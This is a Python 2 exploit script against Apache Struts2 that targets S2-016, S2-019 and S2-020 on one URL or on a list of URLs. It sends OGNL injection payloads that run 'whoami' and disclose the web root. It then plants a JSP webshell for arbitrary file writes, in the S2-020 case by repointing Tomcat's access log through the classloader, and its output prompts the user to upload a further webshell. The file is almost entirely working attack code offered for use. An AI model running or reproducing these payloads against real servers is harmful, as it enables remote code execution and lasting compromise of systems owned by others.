# coding: UTF-8
import urllib2,urllib
import sys
from bs4 import BeautifulSoup
import re
import getopt

class struts(object):
	def sixteen(self,url):
		result=[]
		cmdpayload='?redirect:$%7B%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%27whoami%27%7D%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char%5B50000%5D,%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29%7D'
		test=url+cmdpayload
		try:
			request = urllib2.Request(test)
			response = urllib2.urlopen(request)
		except:
			return(0)
		if(response.code==200):
			print "\n  "+url
			print "  This url can be attacted by S2-016"
			systemname=response.read()
			for i in range(len(systemname)):
				if(systemname[i]!="\x00" and systemname[i]!="\n" and systemname[i]!="\r"):
					result.append(systemname[i])
			str= ''.join(result)
			print "  Whoami:"+str
			pathpayload="?redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
			test=url+pathpayload
			request = urllib2.Request(test)
			response = urllib2.urlopen(request)
			webpath=response.read()
			for i in range(len(webpath)):
				if(webpath[i]!="\x00" and webpath[i]!="\n" and webpath[i]!="\r"):
					result.append(webpath[i])
			str= ''.join(result)
			print "  WebPath:"+str
			shellpayload='''?redirect:$%7B%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22one.jsp%22).replaceAll(%22%5C%5C%5C%5C%22,%20%22/%22),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()%7D&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e'''
			test=url+shellpayload
			try:
				request = urllib2.Request(test)
				response = urllib2.urlopen(request)
			except:
				pass
			if (response.code==200):
				print "  The webshell may have uploaded to "+webpath.strip()+"one.jsp"
				print "  Try to edit and use upload.html to upload your webshell\n"
		
	def nineteen(self,url):
		result=[]
		data="debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()"
		request=urllib2.Request(url)
		opener=urllib2.build_opener(urllib2.HTTPCookieProcessor())
		try:
			response=opener.open(request,data)
		except:
			return(0)
		if(response.code==200):
			print "\n  "+url
			print "  This url can be attacted by S2-019"
			systemname=response.read()
			for i in range(len(systemname)):
				if(systemname[i]!="\x00" and systemname[i]!="\n" and systemname[i]!="\r"):
					result.append(systemname[i])
			str= ''.join(result)
			print "  Whoami:"+str
			data="""debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#a=#req.getSession(),#b=#a.getServletContext(),#c=#b.getRealPath("/"),#matt=%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C#matt.getWriter().println(#c),#matt.getWriter().flush(),#matt.getWriter().close()"""
			request=urllib2.Request(url)
			opener=urllib2.build_opener(urllib2.HTTPCookieProcessor())
			response=opener.open(request,data)
			webpath=response.read()
			for i in range(len(webpath)):
				if(webpath[i]!="\x00" and webpath[i]!="\n" and webpath[i]!="\r"):
					result.append(webpath[i])
			str= ''.join(result)
			print "  WebPath:"+str
			data="""debug=command&expression=%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22one.jsp%22)).append(%23req.getParameter(%22shell%22)).close()&shell=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e"""
			try:
				request=urllib2.Request(url)
				opener=urllib2.build_opener(urllib2.HTTPCookieProcessor())
				response=opener.open(request,data)
			except:
				pass
			if (response.code==200):
				print "  The webshell may have uploaded to "+webpath.strip()+"one.jsp"
				print "  Try to edit and use upload.html to upload your webshell\n"

	def twenty(self,url):
		result=[]
		test=url+"$$"
		request = urllib2.Request(test)
		try:
			urllib2.urlopen(request)
		except urllib2.URLError, e:   
			error=e.read()
		if(e.code==404):
			soup = BeautifulSoup(error)
			
			if(re.search("8",soup.h3.string)):
				print "\n  "+url
				print "  Tomcat Version:"+soup.h3.string
				print "  This url may can be attacted by S2-020"
				payload="?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
				test=url+payload
				request = urllib2.Request(test)
				response = urllib2.urlopen(request)
				get1=response.code
				payload="?class.classLoader.resources.context.parent.pipeline.first.prefix=one"
				test=url+payload
				request = urllib2.Request(test)
				response = urllib2.urlopen(request)
				get2=response.code
				payload="?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
				test=url+payload
				request = urllib2.Request(test)
				response = urllib2.urlopen(request)
				get3=response.code
				payload="?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1"
				test=url+payload
				request = urllib2.Request(test)
				response = urllib2.urlopen(request)
				get4=response.code
				payload="""?a=<%if(request.getParameter("f")!=null)(new/**/java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%><a%20href="One_OK"></a>"""
				test=url+payload
				request = urllib2.Request(test)
				response = urllib2.urlopen(request)
				get5=response.code
				if(get5==200 and get4==200 and get3==200 and get2==200 and get1==200):
					print "  The webshell may have uploaded to /one1.jsp"
					print "  Try to edit and use upload.html to upload your webshell\n"
		
			

	def message(self):
		print "You should use -u to test single website / or use -l to import a txt file to test more website"
		
		
if __name__ == '__main__':
	struts=struts()
	try:
		opts,args=getopt.getopt(sys.argv[1:],"u:l:")
	except getopt.GetoptError:
		struts.message()
		sys.exit(2)
	if not len(opts):
		struts.message()
		sys.exit(2)
	for o, a in opts:  
		if o in ("-u"):  
			struts.sixteen(a)
			struts.nineteen(a)
			struts.twenty(a)
		if o in ("-l"):
			for line in open(a):
				struts.sixteen(line)
				struts.nineteen(line)
				struts.twenty(line)
			
			